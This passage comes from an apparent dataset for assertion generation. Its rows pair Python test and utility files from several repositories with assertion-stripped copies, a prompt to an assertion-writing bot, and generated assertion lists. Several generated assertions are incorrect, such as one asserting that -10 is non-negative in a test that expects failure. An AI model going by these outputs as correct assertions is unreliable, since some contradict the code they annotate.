27        'Error pulling image',
28        'Server error: Status 502 while fetching image layer',
29    ]
30    max_tries = 10
31    rc, _ = call_docker_pull_repeatedly(base_image, known_error_strings, max_tries)
32    return rc
33
34
35def get_base_image_from_dockerfile(dockerfile):
36    with open(dockerfile, 'r') as h:
37        content = h.read()
38    lines = content.splitlines()
39    from_prefix = 'FROM '
40    for line in lines:
41        if line.startswith(from_prefix):
42            return line[len(from_prefix):]
43        ""Could not find a line starting with '%s' in the Dockerfile '%s'"" % \
44        (from_prefix, dockerfile)
45
46
47def call_docker_pull_repeatedly(base_image, known_error_strings, max_tries):
48    for i in range(1, max_tries + 1):
49        if i > 1:
50            sleep_time = 5 + 2 * i
51            print(""Reinvoke 'docker pull' (%d/%d) after sleeping %s seconds"" %
52                  (i, max_tries, sleep_time))
53            sleep(sleep_time)
54        rc, known_error_conditions = call_docker_pull(base_image, known_error_strings)
55        if rc == 0 or not known_error_conditions:
56            break
57        print('')
58        print('Invocation failed due to the following known error conditions: '
59              ', '.join(known_error_conditions))
60        print('')
61        # retry in case of failure with known error condition
62    return rc, known_error_conditions
63
64
65def call_docker_pull(base_image, known_error_strings):
66    known_error_conditions = []
67
68    cmd = ['docker', 'pull', base_image]
69    print('Check docker base image for updates: %s' % ' '.join(cmd))
70    proc = subprocess.Popen(
71        cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
72    while True:
73        line = proc.stdout.readline()
74        if not line:
75            break
76        line = line.decode()
77        sys.stdout.write(line)
78        for known_error_string in known_error_strings:
79            if known_error_string in line:
80                if known_error_string not in known_error_conditions:
81                    known_error_conditions.append(known_error_string)
82    proc.wait()
83    rc = proc.returncode
84    return rc, known_error_conditions
85
86
87if __name__ == '__main__':
88    sys.exit(main())
89",4838,"[[21, 'argv', '!=', [], ""There should be arguments passed in the list 'argv'""],
 [31, 'max_tries', '>=', 1, ""The number of maximum tries for a docker pull should be at least 1""],
 [31, 'known_error_strings', '!=', [], ""There should be some known error strings defined""],
 [48, 'max_tries', '>=', 1, ""The iteration should go through at least one trial""],
 [54, 'known_error_strings', '!=', [], ""There should be some known error strings defined""],
 [68, 'base_image', '!=', '', ""The base image string should not be empty""],
 [72, 'cmd', '!=', [], ""'cmd' for subprocess should not be an empty list""],
 [84, 'rc', '>=', 0, ""Return code should be positive""]]"
ryan-talley/f5-cccl,"#!/usr/bin/env python
# Copyright (c) 2017,2018, F5 Networks, Inc.
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#    http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
#

from f5_cccl.resource.ltm.profile import Profile
from mock import Mock
import pytest


cfg_test = {
    'name': 'tcp',
    'partition': 'Common',
    'context': 'all'
}


@pytest.fixture
def bigip():
    bigip = Mock()
    return bigip


def test_create_profile():
    """"""Test Profile creation.""""""
    profile = Profile(
        **cfg_test
    )
    assert profile

    # verify all cfg items
    for k,v in cfg_test.items():
        assert profile.data[k] == v


def test_eq():
    """"""Test Profile equality.""""""
    partition = 'Common'
    name = 'tcp'

    profile1 = Profile(
        **cfg_test
    )
    profile2 = Profile(
        **cfg_test
    )
    assert profile1
    assert profile2
    assert id(profile1) != id(profile2)
    assert profile1 == profile2

    # not equal
    profile2.data['context'] = 'serverside'
    assert profile1 != profile2

    # different objects
    assert profile1 != ""profile1""


def test_uri_path(bigip):
    """"""Test Profile URI.""""""
    profile = Profile(
        **cfg_test
    )
    assert profile

    with pytest.raises(NotImplementedError):
        profile._uri_path(bigip)

def test_repr():
    """"""Test get repr.""""""
    profile = Profile(
        **cfg_test
    )
    assert profile

    assert (
        repr(profile) == ""Profile('tcp', 'Common', context='all')"")
","
1#!/usr/bin/env python
2# Copyright (c) 2017,2018, F5 Networks, Inc.
3#
4# Licensed under the Apache License, Version 2.0 (the ""License"");
5# you may not use this file except in compliance with the License.
6# You may obtain a copy of the License at
7#
8#    http://www.apache.org/licenses/LICENSE-2.0
9#
10# Unless required by applicable law or agreed to in writing, software
11# distributed under the License is distributed on an ""AS IS"" BASIS,
12# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
13# See the License for the specific language governing permissions and
14# limitations under the License.
15#
16
17from f5_cccl.resource.ltm.profile import Profile
18from mock import Mock
19import pytest
20
21
22cfg_test = {
23    'name': 'tcp',
24    'partition': 'Common',
25    'context': 'all'
26}
27
28
29@pytest.fixture
30def bigip():
31    bigip = Mock()
32    return bigip
33
34
35def test_create_profile():
36    """"""Test Profile creation.""""""
37    profile = Profile(
38        **cfg_test
39    )
40
41    # verify all cfg items
42    for k,v in cfg_test.items():
43
44
45def test_eq():
46    """"""Test Profile equality.""""""
47    partition = 'Common'
48    name = 'tcp'
49
50    profile1 = Profile(
51        **cfg_test
52    )
53    profile2 = Profile(
54        **cfg_test
55    )
56
57    # not equal
58    profile2.data['context'] = 'serverside'
59
60    # different objects
61
62
63def test_uri_path(bigip):
64    """"""Test Profile URI.""""""
65    profile = Profile(
66        **cfg_test
67    )
68
69    with pytest.raises(NotImplementedError):
70        profile._uri_path(bigip)
71
72def test_repr():
73    """"""Test get repr.""""""
74    profile = Profile(
75        **cfg_test
76    )
77
78        repr(profile) == ""Profile('tcp', 'Common', context='all')"")
79","[['profile', '==', 'True'], ['profile.data[k]', '==', 'v'], ['profile1', '==', 'True'], ['profile2', '==', 'True'], ['id(profile1)', '!=', 'id(profile2)'], ['profile1', '==', 'profile2'], ['profile1', '!=', 'profile2'], ['profile1', '!=', '""profile1""'], ['profile', '==', 'True'], ['profile', '==', 'True'], ['(', '==', 'True']]",11,11,1.0,0.0057113187954309,"['cfg_test', 'bigip', 'profile', 'partition', 'name', 'profile1', 'profile2', ""profile2.data['context']""]",8,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['cfg_test', 'bigip', 'profile', 'partition', 'name', 'profile1', 'profile2', ""profile2.data['context']""]
*Code:

1#!/usr/bin/env python
2# Copyright (c) 2017,2018, F5 Networks, Inc.
3#
4# Licensed under the Apache License, Version 2.0 (the ""License"");
5# you may not use this file except in compliance with the License.
6# You may obtain a copy of the License at
7#
8#    http://www.apache.org/licenses/LICENSE-2.0
9#
10# Unless required by applicable law or agreed to in writing, software
11# distributed under the License is distributed on an ""AS IS"" BASIS,
12# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
13# See the License for the specific language governing permissions and
14# limitations under the License.
15#
16
17from f5_cccl.resource.ltm.profile import Profile
18from mock import Mock
19import pytest
20
21
22cfg_test = {
23    'name': 'tcp',
24    'partition': 'Common',
25    'context': 'all'
26}
27
28
29@pytest.fixture
30def bigip():
31    bigip = Mock()
32    return bigip
33
34
35def test_create_profile():
36    """"""Test Profile creation.""""""
37    profile = Profile(
38        **cfg_test
39    )
40
41    # verify all cfg items
42    for k,v in cfg_test.items():
43
44
45def test_eq():
46    """"""Test Profile equality.""""""
47    partition = 'Common'
48    name = 'tcp'
49
50    profile1 = Profile(
51        **cfg_test
52    )
53    profile2 = Profile(
54        **cfg_test
55    )
56
57    # not equal
58    profile2.data['context'] = 'serverside'
59
60    # different objects
61
62
63def test_uri_path(bigip):
64    """"""Test Profile URI.""""""
65    profile = Profile(
66        **cfg_test
67    )
68
69    with pytest.raises(NotImplementedError):
70        profile._uri_path(bigip)
71
72def test_repr():
73    """"""Test get repr.""""""
74    profile = Profile(
75        **cfg_test
76    )
77
78        repr(profile) == ""Profile('tcp', 'Common', context='all')"")
79",3277,"[[36, 'cfg_test', '!=', None, ""cfg_test can't be None when creating a profile""],
 [50, 'cfg_test', '!=', None, ""cfg_test can't be None when creating a profile""],
 [65, 'cfg_test', '!=', None, ""cfg_test can't be None when creating a profile""],
 [74, 'cfg_test', '!=', None, ""cfg_test can't be None when creating a profile""],
 [42, 'v', '!=', None, ""cfg_test dictionary items can't be None""],
 [58, ""profile2.data['context']"", '!=', None, ""context in profile2's data can't be None""],
 [69, 'bigip', '!=', None, ""bigip can't be None when testing URI path""]]"
zdary/intellij-community,"import sys
import threading
import pytest
from pydev_tests_python.debugger_unittest import IS_PY36_OR_GREATER, IS_CPYTHON
from pydev_tests_python.debug_constants import TEST_CYTHON

pytestmark = pytest.mark.skipif(not IS_PY36_OR_GREATER or not IS_CPYTHON or not TEST_CYTHON, reason='Requires CPython >= 3.6')


def get_foo_frame():
    frame = sys._getframe()
    return frame


class CheckClass(object):

    def collect_info(self):
        from _pydevd_frame_eval import pydevd_frame_evaluator
        thread_info = pydevd_frame_evaluator.get_thread_info_py()
        self.thread_info = thread_info


@pytest.mark.parametrize('_times', range(2))
def test_thread_info(_times):
    obj = CheckClass()
    obj.collect_info()
    assert obj.thread_info.additional_info is not None
    assert not obj.thread_info.is_pydevd_thread
    thread_info = obj.thread_info
    obj.collect_info()
    assert obj.thread_info is thread_info

    obj = CheckClass()
    t = threading.Thread(target=obj.collect_info)
    t.is_pydev_daemon_thread = True
    t.start()
    t.join()

    assert obj.thread_info.additional_info is None
    assert obj.thread_info.is_pydevd_thread


def method():
    pass


@pytest.fixture
def _custom_global_dbg():
    from _pydevd_bundle.pydevd_constants import GlobalDebuggerHolder
    from pydevd import PyDB
    curr = GlobalDebuggerHolder.global_dbg
    PyDB()  # Will make itself current
    yield
    GlobalDebuggerHolder.global_dbg = curr


@pytest.mark.parametrize('_times', range(2))
def test_func_code_info(_times, _custom_global_dbg):
    from _pydevd_frame_eval import pydevd_frame_evaluator
    # Must be called before get_func_code_info_py to initialize the _code_extra_index.
    pydevd_frame_evaluator.get_thread_info_py()

    func_info = pydevd_frame_evaluator.get_func_code_info_py(method.__code__)
    assert func_info.co_filename is method.__code__.co_filename
    func_info2 = pydevd_frame_evaluator.get_func_code_info_py(method.__code__)
    assert func_info is func_info2

    some_func = eval('lambda:0')
    func_info3 = pydevd_frame_evaluator.get_func_code_info_py(some_func.__code__)
    del some_func
    del func_info3

    some_func = eval('lambda:0')
    pydevd_frame_evaluator.get_func_code_info_py(some_func.__code__)
    func_info = pydevd_frame_evaluator.get_func_code_info_py(some_func.__code__)
    assert pydevd_frame_evaluator.get_func_code_info_py(some_func.__code__) is func_info
","
1import sys
2import threading
3import pytest
4from pydev_tests_python.debugger_unittest import IS_PY36_OR_GREATER, IS_CPYTHON
5from pydev_tests_python.debug_constants import TEST_CYTHON
6
7pytestmark = pytest.mark.skipif(not IS_PY36_OR_GREATER or not IS_CPYTHON or not TEST_CYTHON, reason='Requires CPython >= 3.6')
8
9
10def get_foo_frame():
11    frame = sys._getframe()
12    return frame
13
14
15class CheckClass(object):
16
17    def collect_info(self):
18        from _pydevd_frame_eval import pydevd_frame_evaluator
19        thread_info = pydevd_frame_evaluator.get_thread_info_py()
20        self.thread_info = thread_info
21
22
23@pytest.mark.parametrize('_times', range(2))
24def test_thread_info(_times):
25    obj = CheckClass()
26    obj.collect_info()
27    thread_info = obj.thread_info
28    obj.collect_info()
29
30    obj = CheckClass()
31    t = threading.Thread(target=obj.collect_info)
32    t.is_pydev_daemon_thread = True
33    t.start()
34    t.join()
35
36
37
38def method():
39    pass
40
41
42@pytest.fixture
43def _custom_global_dbg():
44    from _pydevd_bundle.pydevd_constants import GlobalDebuggerHolder
45    from pydevd import PyDB
46    curr = GlobalDebuggerHolder.global_dbg
47    PyDB()  # Will make itself current
48    yield
49    GlobalDebuggerHolder.global_dbg = curr
50
51
52@pytest.mark.parametrize('_times', range(2))
53def test_func_code_info(_times, _custom_global_dbg):
54    from _pydevd_frame_eval import pydevd_frame_evaluator
55    # Must be called before get_func_code_info_py to initialize the _code_extra_index.
56    pydevd_frame_evaluator.get_thread_info_py()
57
58    func_info = pydevd_frame_evaluator.get_func_code_info_py(method.__code__)
59    func_info2 = pydevd_frame_evaluator.get_func_code_info_py(method.__code__)
60
61    some_func = eval('lambda:0')
62    func_info3 = pydevd_frame_evaluator.get_func_code_info_py(some_func.__code__)
63    del some_func
64    del func_info3
65
66    some_func = eval('lambda:0')
67    pydevd_frame_evaluator.get_func_code_info_py(some_func.__code__)
68    func_info = pydevd_frame_evaluator.get_func_code_info_py(some_func.__code__)
69","[['obj.thread_info.additional_info', '==', 'not None'], ['obj.thread_info.is_pydevd_thread', '==', 'False'], ['obj.thread_info', '==', 'thread_info'], ['obj.thread_info.additional_info', '==', 'None'], ['obj.thread_info.is_pydevd_thread', '==', 'True'], ['func_info.co_filename', '==', 'method.__code__.co_filename'], ['func_info', '==', 'func_info2'], ['pydevd_frame_evaluator.get_func_code_info_py(some_func.__code__)', '==', 'func_info']]",8,8,1.0,0.0032840722495894,"['pytestmark', 'frame', 'thread_info', 'self.thread_info', '_times', 'obj', 't', 't.is_pydev_daemon_thread', 'curr', 'GlobalDebuggerHolder.global_dbg', '_custom_global_dbg', 'func_info', 'func_info2', 'some_func', 'func_info3']",15,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['pytestmark', 'frame', 'thread_info', 'self.thread_info', '_times', 'obj', 't', 't.is_pydev_daemon_thread', 'curr', 'GlobalDebuggerHolder.global_dbg', '_custom_global_dbg', 'func_info', 'func_info2', 'some_func', 'func_info3']
*Code:

1import sys
2import threading
3import pytest
4from pydev_tests_python.debugger_unittest import IS_PY36_OR_GREATER, IS_CPYTHON
5from pydev_tests_python.debug_constants import TEST_CYTHON
6
7pytestmark = pytest.mark.skipif(not IS_PY36_OR_GREATER or not IS_CPYTHON or not TEST_CYTHON, reason='Requires CPython >= 3.6')
8
9
10def get_foo_frame():
11    frame = sys._getframe()
12    return frame
13
14
15class CheckClass(object):
16
17    def collect_info(self):
18        from _pydevd_frame_eval import pydevd_frame_evaluator
19        thread_info = pydevd_frame_evaluator.get_thread_info_py()
20        self.thread_info = thread_info
21
22
23@pytest.mark.parametrize('_times', range(2))
24def test_thread_info(_times):
25    obj = CheckClass()
26    obj.collect_info()
27    thread_info = obj.thread_info
28    obj.collect_info()
29
30    obj = CheckClass()
31    t = threading.Thread(target=obj.collect_info)
32    t.is_pydev_daemon_thread = True
33    t.start()
34    t.join()
35
36
37
38def method():
39    pass
40
41
42@pytest.fixture
43def _custom_global_dbg():
44    from _pydevd_bundle.pydevd_constants import GlobalDebuggerHolder
45    from pydevd import PyDB
46    curr = GlobalDebuggerHolder.global_dbg
47    PyDB()  # Will make itself current
48    yield
49    GlobalDebuggerHolder.global_dbg = curr
50
51
52@pytest.mark.parametrize('_times', range(2))
53def test_func_code_info(_times, _custom_global_dbg):
54    from _pydevd_frame_eval import pydevd_frame_evaluator
55    # Must be called before get_func_code_info_py to initialize the _code_extra_index.
56    pydevd_frame_evaluator.get_thread_info_py()
57
58    func_info = pydevd_frame_evaluator.get_func_code_info_py(method.__code__)
59    func_info2 = pydevd_frame_evaluator.get_func_code_info_py(method.__code__)
60
61    some_func = eval('lambda:0')
62    func_info3 = pydevd_frame_evaluator.get_func_code_info_py(some_func.__code__)
63    del some_func
64    del func_info3
65
66    some_func = eval('lambda:0')
67    pydevd_frame_evaluator.get_func_code_info_py(some_func.__code__)
68    func_info = pydevd_frame_evaluator.get_func_code_info_py(some_func.__code__)
69",3745,"[[10, 'frame', '!=', None, ""We must confirm that sys._getframe() does not return 'None'""],
 [19, 'thread_info', '!=', None, ""thread_info must not be None to make sure get_thread_info_py() returns a valid value""],
 [27, 'thread_info', '!=', None, ""thread_info must not be None to ensure that obj.collect_info() was successful""],
 [32, 't.is_pydev_daemon_thread', '==', True, ""It's vital to ensure that thread becomes a daemon thread""],
 [45, 'GlobalDebuggerHolder.global_dbg', '!=', None, ""Global debug holder should not be None before PyDB() call""],
 [49, 'GlobalDebuggerHolder.global_dbg', '!=', None, ""Global debug holder should not be None after yield""],
 [57, 'thread_info', '!=', None, ""thread_info must not be None to make sure get_thread_info_py() returns a valid value""],
 [59, 'func_info', '!=', None, ""func_info must not be None to make sure get_func_code_info_py() has returned a valid value""],
 [62, 'func_info3', '!=', None, ""func_info3 must not be None to make sure get_func_code_info_py() has returned a valid value""],
 [68, 'func_info', '!=', None, ""func_info must not be None to make sure get_func_code_info_py() has returned a valid value""]]"
totalgood/twote,"#!/usr/bin/env python
# -*- coding: utf-8 -*-

import pytest
from openchat.skeleton import fib

__author__ = ""Hobson Lane""
__copyright__ = ""Hobson Lane""
__license__ = ""mit""


def test_fib():
    assert fib(1) == 1
    assert fib(2) == 1
    assert fib(7) == 13
    with pytest.raises(AssertionError):
        fib(-10)
","
1#!/usr/bin/env python
2# -*- coding: utf-8 -*-
3
4import pytest
5from openchat.skeleton import fib
6
7__author__ = ""Hobson Lane""
8__copyright__ = ""Hobson Lane""
9__license__ = ""mit""
10
11
12def test_fib():
13    with pytest.raises(AssertionError):
14        fib(-10)
15","[['fib(1)', '==', '1'], ['fib(2)', '==', '1'], ['fib(7)', '==', '13']]",3,3,1.0,0.0094339622641509,"['__author__', '__copyright__', '__license__']",3,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['__author__', '__copyright__', '__license__']
*Code:

1#!/usr/bin/env python
2# -*- coding: utf-8 -*-
3
4import pytest
5from openchat.skeleton import fib
6
7__author__ = ""Hobson Lane""
8__copyright__ = ""Hobson Lane""
9__license__ = ""mit""
10
11
12def test_fib():
13    with pytest.raises(AssertionError):
14        fib(-10)
15",1696,"[14, '-10', >=, 0, ""the fibonacci sequence can only be calculated for non-negative integers""]"
lino-framework/xl,"# -*- coding: UTF-8 -*-
# Copyright 2014-2021 Rumma & Ko Ltd
# License: GNU Affero General Public License v3 (see file COPYING for details)
""""""Makes sure that there is at least one excerpt for every ExcerptType.
Render all excerpts by running their do_print method.

""""""

import traceback

from lino.api import rt, dd

SEVERE = True


def objects():
    ExcerptType = rt.models.excerpts.ExcerptType
    Excerpt = rt.models.excerpts.Excerpt

    if not dd.plugins.excerpts.responsible_user:
        return

    ses = rt.login(dd.plugins.excerpts.responsible_user)

    for et in ExcerptType.objects.all().order_by('id'):
        model = et.content_type.model_class()
        qs = model.get_printable_demo_objects()
        # if issubclass(model, Certifiable):
        #     qs = model.get_printable_demo_objects(et)
        # else:
        #     qs = model.objects.all()
        #     if qs.count() > 0:
        #         qs = [qs[0]]
        # if et.certifying:
        for obj in qs:
            ses.selected_rows = [obj]
            yield et.get_or_create_excerpt(ses)
        # qs2 = Excerpt.objects.filter(excerpt_type=et)
        # if qs2.count() == 0:
        #     if qs.count() > 0:
        #         ses.selected_rows = [qs[0]]
        #         yield et.get_or_create_excerpt(ses)

    for obj in Excerpt.objects.all():
        # dd.logger.info(""20150526 rendering %s"", obj)
        try:
            rv = ses.run(obj.do_print)
            assert rv['success']
        except Warning as e:
            dd.logger.warning(
                ""Failed to render %s : %s"", obj, e)
        except Exception as e:
            if SEVERE:
                raise
            else:
                traceback.print_exc()
                dd.logger.warning(
                    ""20160311 failed to render %s : %s"", obj, e)
","
1# -*- coding: UTF-8 -*-
2# Copyright 2014-2021 Rumma & Ko Ltd
3# License: GNU Affero General Public License v3 (see file COPYING for details)
4""""""Makes sure that there is at least one excerpt for every ExcerptType.
5Render all excerpts by running their do_print method.
6
7""""""
8
9import traceback
10
11from lino.api import rt, dd
12
13SEVERE = True
14
15
16def objects():
17    ExcerptType = rt.models.excerpts.ExcerptType
18    Excerpt = rt.models.excerpts.Excerpt
19
20    if not dd.plugins.excerpts.responsible_user:
21        return
22
23    ses = rt.login(dd.plugins.excerpts.responsible_user)
24
25    for et in ExcerptType.objects.all().order_by('id'):
26        model = et.content_type.model_class()
27        qs = model.get_printable_demo_objects()
28        # if issubclass(model, Certifiable):
29        #     qs = model.get_printable_demo_objects(et)
30        # else:
31        #     qs = model.objects.all()
32        #     if qs.count() > 0:
33        #         qs = [qs[0]]
34        # if et.certifying:
35        for obj in qs:
36            ses.selected_rows = [obj]
37            yield et.get_or_create_excerpt(ses)
38        # qs2 = Excerpt.objects.filter(excerpt_type=et)
39        # if qs2.count() == 0:
40        #     if qs.count() > 0:
41        #         ses.selected_rows = [qs[0]]
42        #         yield et.get_or_create_excerpt(ses)
43
44    for obj in Excerpt.objects.all():
45        # dd.logger.info(""20150526 rendering %s"", obj)
46        try:
47            rv = ses.run(obj.do_print)
48        except Warning as e:
49            dd.logger.warning(
50                ""Failed to render %s : %s"", obj, e)
51        except Exception as e:
52            if SEVERE:
53                raise
54            else:
55                traceback.print_exc()
56                dd.logger.warning(
57                    ""20160311 failed to render %s : %s"", obj, e)
58","[[""rv['success']"", '==', 'True']]",1,1,1.0,0.0005512679162072,"['SEVERE', 'ExcerptType', 'Excerpt', 'ses', 'model', 'qs', '#     qs', '#         qs', 'ses.selected_rows', '# qs2', '#         ses.selected_rows', 'rv']",12,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['SEVERE', 'ExcerptType', 'Excerpt', 'ses', 'model', 'qs', '#     qs', '#         qs', 'ses.selected_rows', '# qs2', '#         ses.selected_rows', 'rv']
*Code:

1# -*- coding: UTF-8 -*-
2# Copyright 2014-2021 Rumma & Ko Ltd
3# License: GNU Affero General Public License v3 (see file COPYING for details)
4""""""Makes sure that there is at least one excerpt for every ExcerptType.
5Render all excerpts by running their do_print method.
6
7""""""
8
9import traceback
10
11from lino.api import rt, dd
12
13SEVERE = True
14
15
16def objects():
17    ExcerptType = rt.models.excerpts.ExcerptType
18    Excerpt = rt.models.excerpts.Excerpt
19
20    if not dd.plugins.excerpts.responsible_user:
21        return
22
23    ses = rt.login(dd.plugins.excerpts.responsible_user)
24
25    for et in ExcerptType.objects.all().order_by('id'):
26        model = et.content_type.model_class()
27        qs = model.get_printable_demo_objects()
28        # if issubclass(model, Certifiable):
29        #     qs = model.get_printable_demo_objects(et)
30        # else:
31        #     qs = model.objects.all()
32        #     if qs.count() > 0:
33        #         qs = [qs[0]]
34        # if et.certifying:
35        for obj in qs:
36            ses.selected_rows = [obj]
37            yield et.get_or_create_excerpt(ses)
38        # qs2 = Excerpt.objects.filter(excerpt_type=et)
39        # if qs2.count() == 0:
40        #     if qs.count() > 0:
41        #         ses.selected_rows = [qs[0]]
42        #         yield et.get_or_create_excerpt(ses)
43
44    for obj in Excerpt.objects.all():
45        # dd.logger.info(""20150526 rendering %s"", obj)
46        try:
47            rv = ses.run(obj.do_print)
48        except Warning as e:
49            dd.logger.warning(
50                ""Failed to render %s : %s"", obj, e)
51        except Exception as e:
52            if SEVERE:
53                raise
54            else:
55                traceback.print_exc()
56                dd.logger.warning(
57                    ""20160311 failed to render %s : %s"", obj, e)
58",3422,"[[13, 'SEVERE', '==', True, ""SEVERE should always be True for error handling purposes""],
 [24, 'ses', '!=', None, ""a session should be successfully created for the responsible user""],
 [25, 'ExcerptType.objects.all().order_by(\'id\')', '!=', [], ""should be at least one ExcerptType object to iterate over""],
 [27, 'qs', '!=', [], ""should be at least one printable demo object""],
 [36, 'ses.selected_rows', '==', 1, ""only one row should be selected at a time""],
 [47, 'rv', '!=', None, ""the print execution should return a value""]]"
wangkangda/hydrachain,"from hydrachain.consensus.simulation import Network, assert_heightdistance
from hydrachain.consensus.simulation import assert_maxrounds, assert_blocktime, log
from hydrachain.consensus.manager import ConsensusManager
from ethereum.transactions import Transaction
import gevent


def test_basic_gevent():
    network = Network(num_nodes=4)
    network.connect_nodes()
    network.normvariate_base_latencies()
    network.start()
    network.run(6)
    r = network.check_consistency()
    # note gevent depends on real clock, therefore results are not predictable
    assert_maxrounds(r)
    assert_heightdistance(r)


def test_basic_simenv():
    network = Network(num_nodes=4, simenv=True)
    network.connect_nodes()
    network.normvariate_base_latencies()
    network.start()
    network.run(5)
    r = network.check_consistency()
    assert_maxrounds(r)
    assert_heightdistance(r, max_distance=1)
    assert_blocktime(r, 1.5)


def test_basic_singlenode():
    network = Network(num_nodes=1, simenv=True)
    network.connect_nodes()
    network.normvariate_base_latencies()
    network.start()
    network.run(5)
    r = network.check_consistency()
    assert_maxrounds(r)
    assert_heightdistance(r)
    assert_blocktime(r, 1.5)


def test_transactions(monkeypatch):
    sim_time = 10
    num_txs = 2
    num_initial_blocks = 2

    monkeypatch.setattr(ConsensusManager, 'num_initial_blocks', num_initial_blocks)

    network = Network(num_nodes=4, simenv=False)
    network.connect_nodes()
    network.normvariate_base_latencies()
    app = network.nodes[0]
    chainservice = app.services.chainservice

    # track txs
    txs = []

    def cb(blk):
        log.DEV('ON NEW HEAD', blk=blk)
        if num_initial_blocks <= blk.number < num_initial_blocks + num_txs:
            if blk.number > num_initial_blocks:
                assert blk.num_transactions() == 1
            sender = chainservice.chain.coinbase
            to = 'x' * 20
            nonce = chainservice.chain.head.get_nonce(sender)
            log.DEV('CREATING TX', nonce=nonce)
            gas = 21000
            gasprice = 1
            value = 1
            assert chainservice.chain.head.get_balance(sender) > gas * gasprice + value
            tx = Transaction(nonce, gasprice, gas, to, value, data='')
            app.services.accounts.sign_tx(sender, tx)
            assert tx.sender == sender

            def _do():
                log.DEV('ADDING TX', nonce=nonce)
                success = chainservice.add_transaction(tx)
                assert success
                log.DEV('ADDED TX', success=success)

            if network.simenv:
                network.simenv.process(_do())
            else:
                gevent.spawn(_do)
            txs.append(tx)

    print(chainservice.on_new_head_cbs)
    chainservice.on_new_head_cbs.append(cb)
    network.start()
    network.run(sim_time)
    r = network.check_consistency()
    log.debug(r)
    expected_head_number = num_initial_blocks + num_txs
    assert chainservice.chain.head.number == expected_head_number
    assert_maxrounds(r)
    assert_heightdistance(r, max_distance=1)
    #assert_blocktime(r, 1.5)

    # check if all txs are received in all chains
    tx_pos = set()
    for app in network.nodes:
        for tx in txs:
            r = app.services.chainservice.chain.index.get_transaction(tx.hash)
            assert len(r) == 3
            t, blk, idx = r
            assert tx == t
            tx_pos.add(r)
        assert len(tx_pos) == len(txs)
","
1from hydrachain.consensus.manager import ConsensusManager
2from ethereum.transactions import Transaction
3import gevent
4
5
6def test_basic_gevent():
